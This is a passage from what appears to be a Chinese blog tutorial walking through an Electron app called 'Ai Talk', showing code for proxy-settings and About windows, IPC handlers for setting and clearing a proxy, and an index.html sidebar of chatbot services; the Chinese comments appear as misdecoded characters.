ä¸Šä¼šå‡ºç° electron èœå•æ ï¼Œå½±å“ç¨‹åºç¾è§‚</span></span><br><span class="line">  mainWindow.<span class="title function_">setMenu</span>(<span class="literal">null</span>);</span><br><span class="line"></span><br><span class="line">  <span class="comment">// åŠ è½½åº”ç”¨ä¸»ç•Œé¢</span></span><br><span class="line">  <span class="comment">// ä½¿ç”¨ path.join ç¡®ä¿è·¨å¹³å°è·¯å¾„å…¼å®¹æ€§ï¼ˆWindows/macOS/Linuxï¼‰</span></span><br><span class="line">  mainWindow.<span class="title function_">loadFile</span>(</span><br><span class="line">    path.<span class="title function_">join</span>(__dirname, <span class="string">&#x27;src&#x27;</span>, <span class="string">&#x27;view&#x27;</span>, <span class="string">&#x27;index.html&#x27;</span>)</span><br><span class="line">  );</span><br><span class="line"></span><br><span class="line">  <span class="comment">// çª—å£å…³é—­äº‹ä»¶å¤„ç†</span></span><br><span class="line">  <span class="comment">// é‡Šæ”¾çª—å£å¼•ç”¨é¿å…å†…å­˜æ³„æ¼ï¼ˆElectron å¤šçª—å£åº”ç”¨å¿…éœ€ï¼‰</span></span><br><span class="line">  mainWindow.<span class="title function_">on</span>(<span class="string">&#x27;closed&#x27;</span>, <span class="function">() =&gt;</span> &#123;</span><br><span class="line">    mainWindow = <span class="literal">null</span>;  <span class="comment">// åƒåœ¾å›æ”¶æ—¶é‡Šæ”¾å†…å­˜</span></span><br><span class="line">  &#125;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div><p>ä»£ç†ç«¯å£ let proxyWindow;</p><div class="highlight-wrap" data-rel="Js"><figure class="iseeu highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * åˆ›å»ºä»£ç†é…ç½®ä¸“ç”¨çª—å£ï¼ˆæ¨¡æ€å¯¹è¯æ¡†ï¼‰</span></span><br><span class="line"><span class="comment"> * ç”¨äºç”¨æˆ·è¾“å…¥ä»£ç†æœåŠ¡å™¨åœ°å€</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">createProxyWindow</span>(<span class="params"></span>) &#123;</span><br><span class="line">  <span class="comment">// åˆ›å»ºä»£ç†é…ç½®çª—å£å®ä¾‹</span></span><br><span class="line">  proxyWindow = <span class="keyword">new</span> <span class="title class_">BrowserWindow</span>(&#123;</span><br><span class="line">    <span class="attr">width</span>: <span class="number">370</span>,     <span class="comment">// çª—å£å®½åº¦ï¼ˆé€‚é…å¸¸è§ä»£ç†åœ°å€è¾“å…¥é•¿åº¦ï¼‰</span></span><br><span class="line">    <span class="attr">height</span>: <span class="number">250</span>,    <span class="comment">// çª—å£é«˜åº¦ï¼ˆå®¹çº³è¾“å…¥æ¡†å’Œæ“ä½œæŒ‰é’®ï¼‰</span></span><br><span class="line">    <span class="attr">icon</span>: <span class="string">&#x27;assets/logo.ico&#x27;</span>, <span class="comment">// çª—å£å›¾æ ‡ï¼ˆWindows/Linuxï¼‰</span></span><br><span class="line">    <span class="attr">parent</span>: mainWindow,  <span class="comment">// è®¾ç½®çˆ¶çª—å£å®ç°æ¨¡æ€æ•ˆæœ</span></span><br><span class="line">    <span class="attr">modal</span>: <span class="literal">true</span>,    <span class="comment">// æ¨¡æ€çª—å£ï¼ˆé˜»æ­¢çˆ¶çª—å£æ“ä½œï¼‰</span></span><br><span class="line">    <span class="attr">show</span>: <span class="literal">false</span>,    <span class="comment">// åˆå§‹éšè—é¿å…é—ªçƒ</span></span><br><span class="line">    <span class="attr">webPreferences</span>: &#123;</span><br><span class="line">      <span class="attr">nodeIntegration</span>: <span class="literal">true</span>,</span><br><span class="line">      <span class="attr">preload</span>: path.<span class="title function_">join</span>(__dirname, <span class="string">&#x27;src&#x27;</span>, <span class="string">&#x27;js&#x27;</span>, <span class="string">&#x27;preload.js&#x27;</span>) <span class="comment">// é¢„åŠ è½½è„šæœ¬</span></span><br><span class="line">    &#125;</span><br><span class="line">  &#125;);</span><br><span class="line"></span><br><span class="line">  <span class="comment">// ç§»é™¤é»˜è®¤èœå•æ </span></span><br><span class="line">  proxyWindow.<span class="title function_">setMenu</span>(<span class="literal">null</span>);</span><br><span class="line"></span><br><span class="line">  <span class="comment">// åŠ è½½ä»£ç†é…ç½®é¡µé¢ï¼ˆå»ºè®®è·¯å¾„ï¼šsrc/view/proxy.htmlï¼‰</span></span><br><span class="line">  proxyWindow.<span class="title function_">loadFile</span>(</span><br><span class="line">    path.<span class="title function_">join</span>(__dirname, <span class="string">&#x27;src&#x27;</span>, <span class="string">&#x27;view&#x27;</span>, <span class="string">&#x27;proxy.html&#x27;</span>)</span><br><span class="line">  );</span><br><span class="line"></span><br><span class="line">  <span class="comment">// é¡µé¢åŠ è½½å®Œæˆåæ˜¾ç¤ºçª—å£ï¼ˆé¿å…ç™½å±ï¼‰</span></span><br><span class="line">  proxyWindow.<span class="title function_">once</span>(<span class="string">&#x27;ready-to-show&#x27;</span>, <span class="function">() =&gt;</span> &#123;</span><br><span class="line">    proxyWindow.<span class="title function_">show</span>();</span><br><span class="line">  &#125;);</span><br><span class="line"></span><br><span class="line">  <span class="comment">// çª—å£å…³é—­äº‹ä»¶å¤„ç†</span></span><br><span class="line">  proxyWindow.<span class="title function_">on</span>(<span class="string">&#x27;closed&#x27;</span>, <span class="function">() =&gt;</span> &#123;</span><br><span class="line">    proxyWindow = <span class="literal">null</span>; <span class="comment">// é‡Šæ”¾å†…å­˜å¼•ç”¨</span></span><br><span class="line">  &#125;);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * IPC é€šä¿¡ï¼šç›‘å¬æ‰“å¼€ä»£ç†é…ç½®çª—å£è¯·æ±‚</span></span><br><span class="line"><span class="comment"> * æ¸²æŸ“è¿›ç¨‹è°ƒç”¨æ–¹å¼ï¼šwindow.electron.ipcRenderer.invoke(&#x27;open-proxy-dialog&#x27;)</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">ipcMain.<span class="title function_">handle</span>(<span class="string">&#x27;open-proxy-dialog&#x27;</span>, <span class="function">() =&gt;</span> &#123;</span><br><span class="line">  <span class="title function_">createProxyWindow</span>(); <span class="comment">// åˆ›å»ºå¹¶æ˜¾ç¤ºä»£ç†çª—å£,è°ƒç”¨çš„æ˜¯ä¸Šæ–¹ function createProxyWindow()çª—å£</span></span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * IPC é€šä¿¡ï¼šè®¾ç½®ä»£ç†æœåŠ¡å™¨</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> &#123;<span class="type">string</span>&#125; <span class="variable">proxyAddress</span> - ä»£ç†åœ°å€ï¼ˆæ ¼å¼ï¼šhost:portï¼‰</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">ipcMain.<span class="title function_">handle</span>(<span class="string">&#x27;set-proxy&#x27;</span>, <span class="function">(<span class="params">event, proxyAddress</span>) =&gt;</span> &#123;</span><br><span class="line">  <span class="comment">// é€šè¿‡ session å¯¹è±¡è®¾ç½®å…¨å±€ä»£ç†</span></span><br><span class="line">  mainWindow.<span class="property">webContents</span>.<span class="property">session</span>.<span class="title function_">setProxy</span>(&#123;</span><br><span class="line">    <span class="attr">proxyRules</span>: <span class="string">`http=<span class="subst">$&#123;proxyAddress&#125;</span>;https=<span class="subst">$&#123;proxyAddress&#125;</span>`</span>, <span class="comment">// åŒæ—¶ä»£ç† HTTP/HTTPS</span></span><br><span class="line">    <span class="attr">proxyBypassRules</span>: <span class="string">&#x27;&lt;local&gt;&#x27;</span> <span class="comment">// ç»•è¿‡æœ¬åœ°åœ°å€ï¼ˆlocalhost, 127.0.0.1 ç­‰ï¼‰</span></span><br><span class="line">  &#125;).<span class="title function_">then</span>(<span class="function">() =&gt;</span> &#123;</span><br><span class="line">    mainWindow.<span class="property">webContents</span>.<span class="title function_">reload</span>(); <span class="comment">// é‡è½½é¡µé¢ä½¿ä»£ç†ç”Ÿæ•ˆ</span></span><br><span class="line">  &#125;).<span class="title function_">catch</span>(<span class="function"><span class="params">err</span> =&gt;</span> &#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">error</span>(<span class="string">&#x27;è®¾ç½®ä»£ç†å¤±è´¥:&#x27;</span>, err);</span><br><span class="line">    <span class="comment">// æ˜¾ç¤ºç³»ç»Ÿçº§é”™è¯¯å¯¹è¯æ¡†</span></span><br><span class="line">    dialog.<span class="title function_">showErrorBox</span>(<span class="string">&#x27;è®¾ç½®ä»£ç†å¤±è´¥&#x27;</span>, <span class="string">&#x27;æ— æ³•è®¾ç½®ä»£ç†: &#x27;</span> + err.<span class="property">message</span>);</span><br><span class="line">  &#125;);</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * IPC é€šä¿¡ï¼šæ¸…é™¤ä»£ç†é…ç½®å¹¶æ¢å¤é»˜è®¤</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">ipcMain.<span class="title function_">handle</span>(<span class="string">&#x27;clear-proxy&#x27;</span>, <span class="function">() =&gt;</span> &#123;</span><br><span class="line">  <span class="comment">// å…ˆæ¸…é™¤ç½‘ç»œç¼“å­˜</span></span><br><span class="line">  mainWindow.<span class="property">webContents</span>.<span class="property">session</span>.<span class="title function_">clearCache</span>()</span><br><span class="line">    .<span class="title function_">then</span>(<span class="function">() =&gt;</span> &#123;</span><br><span class="line">      <span class="comment">// é‡ç½®ä»£ç†è®¾ç½®ä¸ºç©ºï¼ˆä½¿ç”¨ç³»ç»Ÿé»˜è®¤ï¼‰</span></span><br><span class="line">      <span class="keyword">return</span> mainWindow.<span class="property">webContents</span>.<span class="property">session</span>.<span class="title function_">setProxy</span>(&#123;&#125;);</span><br><span class="line">    &#125;)</span><br><span class="line">    .<span class="title function_">then</span>(<span class="function">() =&gt;</span> &#123;</span><br><span class="line">      mainWindow.<span class="property">webContents</span>.<span class="title function_">reload</span>(); <span class="comment">// é‡è½½é¡µé¢åº”ç”¨æ›´æ”¹</span></span><br><span class="line">      <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;ä»£ç†å·²æ¸…é™¤ï¼Œæ¢å¤é»˜è®¤è®¾ç½®&#x27;</span>);</span><br><span class="line">    &#125;)</span><br><span class="line">    .<span class="title function_">catch</span>(<span class="function"><span class="params">err</span> =&gt;</span> &#123;</span><br><span class="line">      <span class="variable language_">console</span>.<span class="title function_">error</span>(<span class="string">&#x27;æ¸…é™¤ä»£ç†å¤±è´¥:&#x27;</span>, err);</span><br><span class="line">      <span class="comment">// å¯åœ¨æ­¤æ·»åŠ é”™è¯¯åé¦ˆåˆ°æ¸²æŸ“è¿›ç¨‹</span></span><br><span class="line">    &#125;);</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure></div><p>å…³äºç¨‹åºçª—å£ let versionWindow</p><div class="highlight-wrap" data-rel="Js"><figure class="iseeu highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * åˆ›å»ºæ˜¾ç¤º&quot;å…³äºç¨‹åº&quot;ä¿¡æ¯çš„æ¨¡æ€çª—å£</span></span><br><span class="line"><span class="comment"> * ç”¨äºå±•ç¤ºç‰ˆæœ¬ä¿¡æ¯ã€ç‰ˆæƒå£°æ˜ã€è®¸å¯è¯ç­‰</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">createVersionWindow</span>(<span class="params"></span>) &#123;</span><br><span class="line">  <span class="comment">// åˆ›å»ºå…³äºçª—å£å®ä¾‹</span></span><br><span class="line">  versionWindow = <span class="keyword">new</span> <span class="title class_">BrowserWindow</span>(&#123;</span><br><span class="line">    <span class="attr">width</span>: <span class="number">500</span>,        <span class="comment">// çª—å£å®½åº¦ï¼ˆé€‚é…å¸¸è§è¯´æ˜æ–‡æ¡£å¸ƒå±€ï¼‰</span></span><br><span class="line">    <span class="attr">height</span>: <span class="number">685</span>,       <span class="comment">// çª—å£é«˜åº¦ï¼ˆå®¹çº³é•¿æ–‡æœ¬å’Œå›¾ç‰‡ï¼‰</span></span><br><span class="line">    <span class="attr">icon</span>: <span class="string">&#x27;assets/logo.ico&#x27;</span>,  <span class="comment">// çª—å£å›¾æ ‡ï¼ˆWindows/Linux ç”Ÿæ•ˆï¼‰</span></span><br><span class="line">    <span class="attr">parent</span>: mainWindow,<span class="comment">// çˆ¶çª—å£è®¾ç½®ï¼ˆå®ç°æ¨¡æ€å¯¹è¯æ¡†æ•ˆæœï¼‰</span></span><br><span class="line">    <span class="attr">modal</span>: <span class="literal">true</span>,       <span class="comment">// æ¨¡æ€çª—å£ï¼ˆé˜»æ­¢çˆ¶çª—å£äº¤äº’ï¼‰</span></span><br><span class="line">    <span class="attr">show</span>: <span class="literal">false</span>,       <span class="comment">// åˆå§‹éšè—é¿å…é¡µé¢åŠ è½½æ—¶é—ªçƒ</span></span><br><span class="line">    <span class="attr">webPreferences</span>: &#123;</span><br><span class="line">      <span class="attr">nodeIntegration</span>: <span class="literal">true</span>,</span><br><span class="line">      <span class="attr">preload</span>: path.<span class="title function_">join</span>(__dirname, <span class="string">&#x27;src&#x27;</span>, <span class="string">&#x27;js&#x27;</span>, <span class="string">&#x27;preload.js&#x27;</span>) <span class="comment">// é¢„åŠ è½½è„šæœ¬è·¯å¾„</span></span><br><span class="line">    &#125;</span><br><span class="line">  &#125;);</span><br><span class="line"></span><br><span class="line">  <span class="comment">// ç§»é™¤é»˜è®¤èœå•æ ï¼ˆå¢å¼ºåŸç”Ÿåº”ç”¨ä½“éªŒï¼‰</span></span><br><span class="line">  versionWindow.<span class="title function_">setMenu</span>(<span class="literal">null</span>);</span><br><span class="line"></span><br><span class="line">  <span class="comment">// åŠ è½½å…³äºé¡µé¢</span></span><br><span class="line">  versionWindow.<span class="title function_">loadFile</span>(</span><br><span class="line">    path.<span class="title function_">join</span>(__dirname, <span class="string">&#x27;src&#x27;</span>, <span class="string">&#x27;view&#x27;</span>, <span class="string">&#x27;about.html&#x27;</span>)</span><br><span class="line">  );</span><br><span class="line"></span><br><span class="line">  <span class="comment">// é¡µé¢åŠ è½½å®Œæˆåæ˜¾ç¤ºçª—å£ï¼ˆç¡®ä¿å†…å®¹æ¸²æŸ“å®Œæˆï¼‰</span></span><br><span class="line">  versionWindow.<span class="title function_">once</span>(<span class="string">&#x27;ready-to-show&#x27;</span>, <span class="function">() =&gt;</span> &#123;</span><br><span class="line">    versionWindow.<span class="title function_">show</span>();</span><br><span class="line">  &#125;);</span><br><span class="line"></span><br><span class="line">  <span class="comment">// çª—å£å…³é—­äº‹ä»¶å¤„ç†ï¼ˆå†…å­˜ç®¡ç†ï¼‰</span></span><br><span class="line">  versionWindow.<span class="title function_">on</span>(<span class="string">&#x27;closed&#x27;</span>, <span class="function">() =&gt;</span> &#123;</span><br><span class="line">    versionWindow = <span class="literal">null</span>;  <span class="comment">// é‡Šæ”¾å†…å­˜å¼•ç”¨é˜²æ­¢å†…å­˜æ³„æ¼</span></span><br><span class="line">  &#125;);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * IPC é€šä¿¡ï¼šç›‘å¬æ‰“å¼€&quot;å…³äºç¨‹åº&quot;çª—å£è¯·æ±‚</span></span><br><span class="line"><span class="comment"> * æ¸²æŸ“è¿›ç¨‹è°ƒç”¨æ–¹å¼ï¼šwindow.electron.ipcRenderer.invoke(&#x27;open-version-dialog&#x27;)</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="comment">// ç›‘å¬æ¸²æŸ“è¿›ç¨‹å‘é€çš„è¯·æ±‚æ¥æ‰“å¼€çª—å£</span></span><br><span class="line">ipcMain.<span class="title function_">handle</span>(<span class="string">&#x27;open-version-dialog&#x27;</span>, <span class="function">() =&gt;</span> &#123;</span><br><span class="line">  <span class="title function_">createVersionWindow</span>();</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure></div><blockquote><p>Index.html åˆ†æ</p></blockquote><div class="highlight-wrap" data-rel="Html"><figure class="iseeu highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span> <span class="attr">lang</span>=<span class="string">&quot;en&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;UTF-8&quot;</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">meta</span> <span class="attr">name</span>=<span class="string">&quot;viewport&quot;</span> <span class="attr">content</span>=<span class="string">&quot;width=device-width, initial-scale=1.0&quot;</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">title</span>&gt;</span>Ai Talk<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line">  <span class="comment">&lt;!--  åŠ è½½ index.html CSS æ ¼å¼--&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">link</span> <span class="attr">rel</span>=<span class="string">&quot;stylesheet&quot;</span> <span class="attr">href</span>=<span class="string">&quot;../css/style.css&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">&quot;container&quot;</span>&gt;</span></span><br><span class="line">    <span class="comment">&lt;!-- æµ‹è¾¹æ  --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">&quot;sidebar&quot;</span>&gt;</span></span><br><span class="line">      <span class="comment">&lt;!-- logo --&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;logo&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">&quot;../../assets/logo.png&quot;</span> <span class="attr">alt</span>=<span class="string">&quot;Logo&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">h1</span> <span class="attr">class</span>=<span class="string">&quot;app_name&quot;</span>&gt;</span>Ai Talk<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"></span><br><span class="line">      <span class="comment">&lt;!-- å¯¹è¯ --&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;dialogue&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">p</span> <span class="attr">class</span>=<span class="string">&quot;dialogue_text&quot;</span>&gt;</span></span><br><span class="line">          é€‰æ‹©å¯¹è¯</span><br><span class="line">          <span class="tag">&lt;<span class="name">button</span> <span class="attr">class</span>=<span class="string">&quot;action_button&quot;</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">&quot;../../assets/dialogue.svg&quot;</span> <span class="attr">alt</span>=<span class="string">&quot;Logo&quot;</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;/<span class="name">button</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"></span><br><span class="line">      <span class="comment">&lt;!-- AI æ¨¡å— --&gt;</span>  </span><br><span class="line">      <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;ai_module&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;icon-item&quot;</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;<span class="name">button</span> <span class="attr">id</span>=<span class="string">&quot;kimi&quot;</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">&quot;../../assets/kimi.ico&quot;</span> <span class="attr">alt</span>=<span class="string">&quot;kimi&quot;</span> <span class="attr">class</span>=<span class="string">&quot;icon-img&quot;</span>&gt;</span> æœˆä¹‹æš—é¢ Kimi</span><br><span class="line">          <span class="tag">&lt;/<span class="name">button</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"></span><br><span class="line">        <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;icon-item&quot;</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;<span class="name">button</span> <span class="attr">id</span>=<span class="string">&quot;deepseek&quot;</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">&quot;../../assets/deepseek.svg&quot;</span> <span class="attr">alt</span>=<span class="string">&quot;DeepSeek&quot;</span> <span class="attr">class</span>=<span class="string">&quot;icon-img&quot;</span>&gt;</span> æ·±åº¦æ±‚ç´¢ DeepSeek</span><br><span class="line">          <span class="tag">&lt;/<span class="name">button</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"></span><br><span class="line">        <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;icon-item&quot;</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;<span class="name">button</span> <span class="attr">id</span>=<span class="string">&quot;doubao&quot;</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">&quot;../../assets/doubao.png&quot;</span> <span class="attr">alt</span>=<span class="string">&quot;doubao&quot;</span> <span class="attr">class</span>=<span class="string">&quot;icon-img&quot;</span>&gt;</span> å­—èŠ‚ è±†åŒ…</span><br><span class="line">          <span class="tag">&lt;/<span class="name">button</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"></span><br><span class="line">        <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;icon-item&quot;</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;<span class="name">button</span> <span class="attr">id</span>=<span class="string">&quot;tyqw&quot;</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">&quot;../../assets/tyqw.png&quot;</span> <span class="attr">alt</span>=<span class="string">&quot;tyqw&quot;</span> <span class="attr">class</span>=<span class="string">&quot;icon-img&quot;</span>&gt;</span> å•Šé‡Œ é€šä¹‰åƒé—®</span><br><span class="line">          <span class="tag">&lt;/<span class="name">button</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"></span><br><span class="line">        <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;icon-item&quot;</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;<span class="name">button</span> <span class="attr">id</span>=<span class="string">&quot;openai&quot;</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">&quot;../../assets/chatgpt.ico&quot;</span> <span class="attr">alt</span>=<span class="string">&quot;OpenAI&quot;</span> <span class="attr">class</span>=<span class="string">&quot;icon-img&quot;</span>&gt;</span> OpenAI ChatGPT</span><br><span class="line">          <span class="tag">&lt;/<span class="name">button</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"></span><br><span class="line">        <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;icon-item&quot;</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;<span 